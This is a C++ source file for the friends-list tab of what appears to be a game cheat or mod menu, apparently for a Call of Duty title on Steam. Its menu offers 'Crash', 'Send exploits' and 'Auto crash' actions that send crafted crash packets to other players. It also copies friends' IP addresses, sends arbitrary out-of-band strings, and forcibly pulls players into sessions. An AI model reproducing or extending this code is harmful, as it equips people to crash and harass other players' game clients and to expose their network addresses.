#include "dependencies/std_include.hpp"
#include "friends.hpp"

namespace friends
{
	std::vector<friends_t> friends; 

	void write_to_friends()
	{
		json j{};

		for (const auto& _friend : friends)
		{
			j[std::to_string(_friend.xuid)] =
			{
				{ "name", _friend.name },
				{ "ip", _friend.adr.empty() ? "0.0.0.0" : _friend.adr },
				{ "auto-crash", exploits::player_exploits[_friend.xuid].auto_crash },
				{ "can-send-oob-packets", _friend.send_oob_packets },
			};
		}

		utils::io::write_file(utils::io::get_json_path(FRIENDS_LIST), j.dump());
	}
	
	void remove_friend(const std::uint64_t id)
	{
		const auto entry = std::find_if(friends.begin(), friends.end(), [&id](const friends_t& steam) { return steam.xuid == id; });

		if (entry != friends.end())
		{
			friends.erase(entry);
		}

		write_to_friends();
	}

	void refresh_friends()
	{
		friends.clear();
		exploits::instant_message::friend_info.clear();

		if (auto file = utils::io::read_json_file(FRIENDS_LIST); file)
		{
			json j = json::parse(file);

			if (j.is_object())
			{
				for (const auto&[key, value] : j.items())
				{
					friends.emplace_back(friends_t 
					{ 
						std::stoull(key), 
						value["name"].get<std::string>(),
						value["ip"].get<std::string>(),
						value["auto-crash"].get<bool>(),
						value["can-send-oob-packets"].get<bool>()
					});

					exploits::player_exploits[std::stoull(key)].auto_crash = value["auto-crash"].get<bool>();
				}
			}
		}
	}

	void friends_list()
	{
		if (ImGui::BeginTabItem("Friends List", nullptr))
		{
			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
			ImGui::BeginColumns("Friends List", 3, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 28.0f);
			ImGui::TextUnformatted("#");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Friend");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Status");
			ImGui::NextColumn();

			ImGui::Separator();

			std::vector<size_t> indices{};

			for (size_t i = 0; i < friends.size(); ++i)
			{
				indices.emplace_back(i);
			}

			std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return exploits::instant_message::friend_info[a].first > exploits::instant_message::friend_info[b].first; });

			for (const auto& client_num : indices)
			{
				const auto friends = friends::friends[client_num];

				if (friends.xuid)
				{
					ImGui::AlignTextToFramePadding();
					ImGui::TextUnformatted(std::to_string(client_num));

					ImGui::NextColumn();

					ImGui::PushStyleColor(ImGuiCol_Text, exploits::instant_message::friend_info[client_num].first
						? ImColor(0, 255, 0, 250).Value : ImColor(200, 200, 200, 250).Value);

					ImGui::AlignTextToFramePadding();
					const auto selected = ImGui::Selectable((friends.name.data() + "##"s + std::to_string(client_num)).data());

					ImGui::PopStyleColor();

					const auto popup = "friend_popup##" + std::to_string(client_num);
					static game::netadr_t netadr{};

					if (selected)
					{
						if (!game::Xenon_RegisterRemoteXenon(&exploits::instant_message::friend_info[client_num].second, &netadr))
						{
							PRINT_LOG("Couldn't register remote address for '%s' (%llu)", friends.name.data(), friends.xuid);
						}

						ImGui::OpenPopup(popup.data());
					}

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						ImGui::MenuItem((friends.name + "##"s + std::to_string(client_num) + "friend_profile_menu").data(),
							nullptr,
							false,
							false);

						if (ImGui::IsItemClicked())
						{
							game::LiveSteam_PopOverlayForSteamID(friends.xuid);
							menu::toggle();
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}

						if (ImGui::BeginMenu("Rename##rename_friend_menu"))
						{
							static auto rename_friend_input = ""s;

							ImGui::InputTextA("##rename_friend_input", &rename_friend_input);

							if (ImGui::MenuItem("Rename##rename_friend"))
							{
								std::replace_if(friends::friends.begin(), friends::friends.end(), [&](const friends_t& steam) 
								{
									return steam.name != rename_friend_input && steam.xuid == friends.xuid; 
								}, friends_t{ friends.xuid, rename_friend_input, friends.adr, friends.auto_crash, friends.send_oob_packets });

								write_to_friends();
							}

							ImGui::EndMenu();
						}

						if (ImGui::MenuItem("Remove##remove_friend_profile"))
						{
							remove_friend(friends.xuid);
						}
						
						ImGui::Separator();

						if (ImGui::MenuItem(std::to_string(friends.xuid).data()))
						{
							ImGui::LogToClipboardUnformatted(std::to_string(friends.xuid).data());
						}

						const auto adr = exploits::instant_message::friend_info[client_num].second;
						const auto session_info_ip_string = utils::string::adr_to_string(&adr);

						const auto ip_string = adr.hostAddress.inaddr ? session_info_ip_string : friends.adr;

						if (ImGui::MenuItem(ip_string.data()))
						{
							ImGui::LogToClipboardUnformatted(ip_string.data());
						}

						ImGui::Separator();

						if (ImGui::MenuItem("Join Session##join_session"))
						{
							if (const auto our_client_num = game::Party_FindMemberByXUID(game::Live_GetXuid(0)); our_client_num >= 0 && game::party->are_we_host())
							{
								exploits::pm = game::party->party_member(our_client_num);
								exploits::target = exploits::pm->platformAddr.netAddr;
								exploits::send_rejoin_packet(game::party, adr);
							}
							else
							{
								exploits::instant_message::pulling::send_join_request_message(friends.xuid);
							}
						}

						if (ImGui::MenuItem("Popup##send_popup"))
						{
							const auto dummy{ 0 };
							game::dwInstantSendMessage(0, &friends.xuid, 1, 'f', &dummy, sizeof dummy);
						}

						if (ImGui::MenuItem("Crash##send_crash"))
						{
							if (game::Party_FindMemberByXUID(friends.xuid) >= 0)
							{
								exploits::instant_message::party::send_ph_crash_packet(game::party, friends.xuid);
								exploits::instant_message::party::send_pseg_crash_packet(game::party, friends.xuid);
								exploits::instant_message::party::send_join_party_crash_packet(friends.xuid);
								exploits::instant_message::party::send_join_party_overflowed_crash_packet(friends.xuid);
							}
						}

						if (ImGui::MenuItem("Send exploits##send_friend_exploits"))
						{
							exploits::target = netadr;
							exploits::pm = {};

							for (auto i = 0u; i < 2u; ++i)
							{
								exploits::send_relay_crash_packet(game::party, exploits::local_net_id);
								exploits::send_join_party_crash_packet(game::party, exploits::local_net_id);
								exploits::send_join_party_overflowed_crash_packet(game::party, exploits::local_net_id);
							}
						}

						if (ImGui::BeginMenu("Send string##send_friend_string"))
						{
							static auto string_input = ""s;

							ImGui::InputTextA("##send_string_input", &string_input);

							if (ImGui::MenuItem("Send string##send_string_to_friend"))
							{
								exploits::target = netadr;
								exploits::pm = {};

								game::oob::send(netadr, string_input);
							}

							ImGui::EndMenu();
						}

						if (ImGui::MenuItem("Pull everyone to friend's session##pull_everyone", nullptr, nullptr, game::party->is_running()))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (const auto our_client_num = game::Party_FindMemberByXUID(game::Live_GetXuid(0)); our_client_num >= 0 && i != our_client_num)
								{
									exploits::pm = game::party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;
									exploits::instant_message::party::send_rejoin_packet(exploits::pm->player, adr);
								}
							}
						}

						if (ImGui::MenuItem("Pull##pull_friend"))
						{
							exploits::instant_message::pulling::setup_instant_message(friends.xuid);
						}

						if (ImGui::MenuItem("Pull 2##pull_friend_2"))
						{
							exploits::target = netadr;
							exploits::pm = {};

							exploits::send_rejoin_packet(game::party, game::party->session->dyn.sessionInfo);
						}

						if (ImGui::Checkbox(("Auto crash##auto_crash" + std::to_string(client_num)).data(), &exploits::player_exploits[friends.xuid].auto_crash))
						{
							write_to_friends();
						}

						if (ImGui::Checkbox(("Send out-of-band packets##send_out_of_band_packets" + std::to_string(client_num)).data(), &friends::friends[client_num].send_oob_packets))
						{
							write_to_friends();
						}

						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					ImGui::AlignTextToFramePadding();

					const auto player_status = game::GetPlayerStatus(friends.xuid);
					auto online_status = "Online"s;

					if (game::Friends_IsFriendByID(0, friends.xuid)
						&& player_status != nullptr
						&& *player_status
						&& std::strcmp(player_status, "Online")
						&& std::strcmp(player_status, "Offline"))
					{
						online_status += " ("s + player_status + ")";
					}
					
					ImGui::TextUnformatted(exploits::instant_message::friend_info[client_num].first ? online_status : "Offline");

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}

			ImGui::PopStyleVar();
			ImGui::EndColumns();

			if (ImGui::CollapsingHeader("Friends", ImGuiTreeNodeFlags_Leaf))
			{
				static auto friend_name_input = ""s;

				ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x * (1.0f / 3));
				ImGui::InputTextA("Friend name##friend_name_input", &friend_name_input);

				static auto friend_steam_id_input = ""s;

				ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x * (1.0f / 3));
				ImGui::InputTextA("Steam id##friend_steam_id_input", &friend_steam_id_input);

				if (ImGui::Button("Add friend##add_friend_friend_list"))
				{
					friends.emplace_back(friends_t{ std::stoull(friend_steam_id_input), friend_name_input, {}, false, true });
					write_to_friends();
				}

				ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);

				if (ImGui::Button("Refresh friends"))
				{
					refresh_friends();
				}

				ImGui::Checkbox("See spoofed friends name", &security::see_spoofed_friend_names);
			}

			ImGui::EndTabItem();
		}
	}
}
